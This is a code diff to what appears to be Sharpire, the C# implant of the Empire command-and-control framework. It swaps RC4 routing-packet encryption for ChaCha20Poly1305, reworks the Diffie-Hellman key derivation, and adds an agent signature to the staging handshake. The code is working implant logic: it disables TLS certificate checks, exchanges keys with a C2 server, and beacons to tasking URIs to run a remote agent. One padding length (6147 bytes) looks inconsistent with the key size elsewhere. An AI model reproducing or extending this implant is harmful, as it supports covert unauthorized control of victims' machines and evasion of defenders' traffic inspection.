@@ -8,7 +8,8 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Numerics;
-
+using ChaChaEncryption;
+using System.Runtime.CompilerServices;
 
 namespace Sharpire
 {
@@ -21,14 +22,14 @@ namespace Sharpire
 
         public byte[] PublicKeyBytes { get; private set; }
         public byte[] PrivateKeyBytes { get; private set; }
-        
+
         public byte[] AesKey { get; private set; }
 
         public DiffieHellman()
         {
             generator = new BigInteger(2);
             prime = BigInteger.Parse(
-                "00"+"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF",
+                "00" + "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF",
                 System.Globalization.NumberStyles.HexNumber
             );
 
@@ -37,47 +38,51 @@ namespace Sharpire
             publicKey = BigInteger.ModPow(generator, privateKey, prime);
             PublicKeyBytes = publicKey.ToByteArray();
         }
-        
+
         public BigInteger BigIntegerFromHexBytes(byte[] bytes)
         {
+            if (bytes.Length > 0 && (bytes[0] & 0x80) != 0)
+            {
+                var tmp = new byte[bytes.Length + 1];
+                Buffer.BlockCopy(bytes, 0, tmp, 1, bytes.Length);
+                bytes = tmp; // tmp[0] is 0x00 by default
+            }
             string hexString = BitConverter.ToString(bytes).Replace("-", "");
             return BigInteger.Parse(hexString, System.Globalization.NumberStyles.HexNumber);
         }
-        
+
         public void GenerateSharedSecret(byte[] serverPubKey)
         {
-            
             BigInteger bigIntValue = BigIntegerFromHexBytes(serverPubKey);
             BigInteger sharedSecret = BigInteger.ModPow(bigIntValue, privateKey, prime);
 
             byte[] rawSharedSecretBytes = sharedSecret.ToByteArray();
             Array.Reverse(rawSharedSecretBytes);
-            
-            BigInteger absSharedSecret = BigInteger.Abs(sharedSecret);
 
-            string binaryString = string.Join("", absSharedSecret
-                .ToByteArray()
-                .Reverse()
-                .Select(b => Convert.ToString(b, 2).PadLeft(8, '0'))); // Convert each byte to binary
-
-            binaryString = binaryString.TrimStart('0');
-            int bitLength = binaryString.Length + 2;
-            int expectedLength = (bitLength + 1); 
-            
-            if (rawSharedSecretBytes.Length > expectedLength)
+            // Always normalize to 6147 bytes
+            int expectedLength = 6147;
+            if (rawSharedSecretBytes.Length < expectedLength)
             {
-                rawSharedSecretBytes = rawSharedSecretBytes.Skip(rawSharedSecretBytes.Length - expectedLength).ToArray();
+                byte[] padded = new byte[expectedLength];
+                Array.Copy(rawSharedSecretBytes, 0, padded,
+                           expectedLength - rawSharedSecretBytes.Length,
+                           rawSharedSecretBytes.Length);
+                rawSharedSecretBytes = padded;
+            }
+            else if (rawSharedSecretBytes.Length > expectedLength)
+            {
+                // Truncate if too long (should rarely happen)
+                rawSharedSecretBytes = rawSharedSecretBytes
+                    .Skip(rawSharedSecretBytes.Length - expectedLength).ToArray();
             }
 
-            byte[] sharedSecretBytes = new byte[expectedLength];
-            Array.Copy(rawSharedSecretBytes, 0, sharedSecretBytes, expectedLength - rawSharedSecretBytes.Length, rawSharedSecretBytes.Length);
 
             using (SHA256 sha256 = SHA256.Create())
             {
-                AesKey = sha256.ComputeHash(sharedSecretBytes);
+                AesKey = sha256.ComputeHash(rawSharedSecretBytes);
             }
         }
-        
+
         private static BigInteger GenerateRandomBigInteger()
         {
             byte[] bytes = new byte[540];
@@ -98,7 +103,7 @@ namespace Sharpire
             return randomInt;
         }
     }
-    
+
     class EmpireStager
     {
         private SessionInfo sessionInfo;
@@ -116,7 +121,7 @@ namespace Sharpire
             public byte[] Extra { get; set; }
             public uint PacketLength { get; set; }
         }
-        
+
         public EmpireStager(SessionInfo sessionInfo1)
         {
             sessionInfo = sessionInfo1;
@@ -151,11 +156,12 @@ namespace Sharpire
         public void Execute()
         {
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-
             try
             {
+
                 var stage1Response = Stage1();
                 Stage2(stage1Response);
+
                 try
                 {
 #if (PRINT)
@@ -196,19 +202,64 @@ namespace Sharpire
         }
 
         public static byte[] BuildRoutingPacket(byte[] key, string sessionId, int meta, byte[] encryptedBytes)
+        /*
+        Constructs a routing packet with chacha20poly1305 encryption.
+        
+        Packet format:
+
+        Nonce: Nonce used by ChaCha20Poly1305
+        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        AESc = AES encrypted using the client's session key
+        ChaCha20(RoutingData): Encrypted RoutingData
+        Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+            Routing Packet:
+            +---------+--------------------------------+--------------------------+
+            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+            +---------+--------------------------------+--------------------------+
+            |    12   |                32              |          length          |
+            +---------+--------------------------------+--------------------------+
+
+                ChaCha20+Poly1305(RoutingData):
+                +---------------------------+---------------------------+
+                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                +---------------------------+---------------------------+
+                |           16              |            16             |
+                +---------------------------+---------------------------+
+
+                    RoutingData:
+                    +-----------+------+------+-------+--------+
+                    | SessionID | Lang | Meta | Extra | Length |
+                    +-----------+------+------+-------+--------+
+                    |    8      |  1   |  1   |   2   |    4   |
+                    +-----------+------+------+-------+--------+
+
+            SessionID = the sessionID that the packet is bound for
+            Lang = indicates the language used
+            Meta = indicates staging req/tasking req/result post/etc.
+            Extra = reserved for future expansion
+        */
         {
             int encryptedBytesLength = (encryptedBytes != null) ? encryptedBytes.Length : 0;
 
+            //prepare the RoutingData
             byte[] data = Encoding.ASCII.GetBytes(sessionId);
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            byte[] initializationVector = NewInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, key);
-            byte[] routingPacketData = rc4Encrypt(rc4Key, data);
+            //encrypt it in chacha20poly1305 
+            byte[] chacha_nonce = NewInitializationVector(12);
+            byte[] poly1305_tag = new byte[16];
+            byte[] chacha_data = new byte[data.Length];
+            ChaCha20Poly1305.Encrypt(key, chacha_nonce, data, out chacha_data, out poly1305_tag);
 
-            routingPacketData = Misc.combine(initializationVector, routingPacketData);
+            //combine the chacha20 encrypted data with its associated poly1305 tag, to make ChaCha20Poly1305(RoutingData)
+            byte[] chacha_poly1305_data = Misc.combine(chacha_data, poly1305_tag);
+            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_poly1305_data);
+
+            //If we have encrypted bytes (AESc), append those to the end
             if (encryptedBytes != null)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
@@ -216,7 +267,7 @@ namespace Sharpire
 
             return routingPacketData;
         }
-        
+
         public static string Utf8StringToHex(string utf8Str)
         {
             BigInteger intValue = BigInteger.Parse(utf8Str);
@@ -240,13 +291,22 @@ namespace Sharpire
 
             return bytes;
         }
-        
+
         private byte[] Stage1()
         {
             DiffieHellman dh = new DiffieHellman(); // Step 1: Create DH key pair
             byte[] publicKeyBytes = dh.PublicKeyBytes;
+            var publicKeyBytesBE = Cert.ToBigEndianFixedFromLE(publicKeyBytes, 768);
             
-            byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, publicKeyBytes);
+            byte[] msg = System.Text.Encoding.ASCII.GetBytes("SIGNATURE");
+            var agent_cert = Cert.signature_unsafe(msg, sessionInfo.GetPrivateKeyBytes(), sessionInfo.GetPublicKeyBytes());
+
+            byte[] stage1Msg = new byte[publicKeyBytesBE.Length + agent_cert.Length];
+            Array.Copy(publicKeyBytesBE, 0, stage1Msg, 0, publicKeyBytesBE.Length);
+            Array.Copy(agent_cert, 0, stage1Msg, publicKeyBytesBE.Length, agent_cert.Length);
+            
+
+            byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, stage1Msg);
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
 
@@ -259,9 +319,9 @@ namespace Sharpire
             byte[] decryptedData = AesDecryptAndVerify(stagingKeyBytes, packet.EncryptedData);
             byte[] nonce = decryptedData.Take(16).ToArray();
             byte[] serverPubKey = decryptedData.Skip(16).ToArray();
-            
+
             string serverPubKeyAscii = Utf8StringToHex(Encoding.UTF8.GetString(serverPubKey));
-            
+
             dh.GenerateSharedSecret(HexStringToByteArray(serverPubKeyAscii));
             sessionInfo.SetSessionKeyBytes(dh.AesKey);
 
@@ -269,31 +329,77 @@ namespace Sharpire
         }
 
         private RoutingPacket DecodeRoutingPacket(byte[] packetData)
+        /*
+       Decodes a chacha20poly1305 encrypted routing packet to a normal routing packet
+
+       Packet format:
+
+       Nonce: Nonce used by ChaCha20Poly1305
+       ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+       AESc = AES encrypted using the client's session key
+       ChaCha20(RoutingData): Encrypted RoutingData
+       Poly1305(RoutingData): Poly1305 tag of RoutingData
+
+
+           Routing Packet:
+           +---------+--------------------------------+--------------------------+
+           |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+           +---------+--------------------------------+--------------------------+
+           |    12   |                32              |          length          |
+           +---------+--------------------------------+--------------------------+
+
+               ChaCha20+Poly1305(RoutingData):
+               +---------------------------+---------------------------+
+               |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+               +---------------------------+---------------------------+
+               |           16              |            16             |
+               +---------------------------+---------------------------+
+
+                   RoutingData:
+                   +-----------+------+------+-------+--------+
+                   | SessionID | Lang | Meta | Extra | Length |
+                   +-----------+------+------+-------+--------+
+                   |    8      |  1   |  1   |   2   |    4   |
+                   +-----------+------+------+-------+--------+
+
+           SessionID = the sessionID that the packet is bound for
+           Lang = indicates the language used
+           Meta = indicates staging req/tasking req/result post/etc.
+           Extra = reserved for future expansion
+       */
         {
-            if (packetData.Length < 20)
+            // define packet structure for ChaCha20Poly1305 (12 byte nonce + 32 bytes for encrypted data and tag. Together is 40 byte header before AESc)
+            int nonce_length = 12;
+            int chacha_header_length = nonce_length + 32;
+            if (packetData.Length < chacha_header_length)
             {
                 return null;
             }
-
             int offset = 0;
 
+            // while we have bytes to read from packetData...
             while (offset < packetData.Length)
             {
-                byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
-                byte[] routingInitializationVector = routingPacket.Take(4).ToArray();
-                byte[] routingEncryptedData = routingPacket.Skip(4).Take(16).ToArray();
-                offset += 20;
+                // parse given packet
+                byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
+                byte[] chachaNonce = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingChachaData = routingPacket.Skip(nonce_length).Take(32).ToArray(); // chacha20 encrypted data and poly1305 tag
+                offset += chacha_header_length;
 
-                byte[] stagingKey = sessionInfo.GetStagingKeyBytes();
-                byte[] rc4Key = Misc.combine(routingInitializationVector, stagingKey);
-                
-                byte[] routingData = rc4Encrypt(rc4Key, routingEncryptedData);
+                // Prep data for decryption
+                byte[] key = sessionInfo.GetStagingKeyBytes();
+                byte[] chachaData = routingChachaData.Take(16).ToArray();
+                byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
 
+                // decrypt encrypted data into routingData
+                byte[] routingData = new byte[16];
+                ChaCha20Poly1305.Decrypt(key, chachaNonce, chachaData, poly1305Tag, out routingData);
+
+                // parse/handle routing data
                 if (routingData.Length < 16)
                 {
                     return null;
                 }
-
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
 
                 byte language = routingData[8];
@@ -308,9 +414,10 @@ namespace Sharpire
 
                 byte[] encryptedData = packetData.Skip(offset).Take((int)packetLength).ToArray();
 
+                // return the new routing packet
                 return new RoutingPacket
                 {
-                    InitializationVector = routingInitializationVector,
+                    InitializationVector = chachaNonce,
                     EncryptedData = encryptedData,
                     DecryptedData = null,
                     SessionId = packetSessionId,
@@ -323,11 +430,11 @@ namespace Sharpire
 
             return null;
         }
-        
+
         private void Stage2(byte[] nonce)
         {
             byte[] keyBytes = sessionInfo.GetSessionKeyBytes();
-            
+
             long increment = Convert.ToInt64(Encoding.ASCII.GetString(nonce)) + 1;
             string newNonce = increment.ToString();
 
@@ -341,7 +448,7 @@ namespace Sharpire
             Random random = new Random();
             SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
         }
-        
+
         private void DotNetEmpire()
         {
             Agent agent = new Agent(sessionInfo);
@@ -356,7 +463,7 @@ namespace Sharpire
                 DotNetEmpire();
             }
         }
-        
+
         public byte[] SendData(string uri, byte[] data)
         {
             byte[] response = new byte[0];
@@ -440,7 +547,7 @@ namespace Sharpire
 
             return Encoding.ASCII.GetBytes(information);
         }
-        
+
         public static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
         {
             byte[] output = new byte[data.Length];
@@ -491,7 +598,7 @@ namespace Sharpire
                 return Misc.combine(encrypted, hmacHash);
             }
         }
-        
+
         public static byte[] aesEncrypt(byte[] keyBytes, byte[] ivBytes, byte[] dataBytes)
         {
             byte[] encryptedBytes = new byte[0];
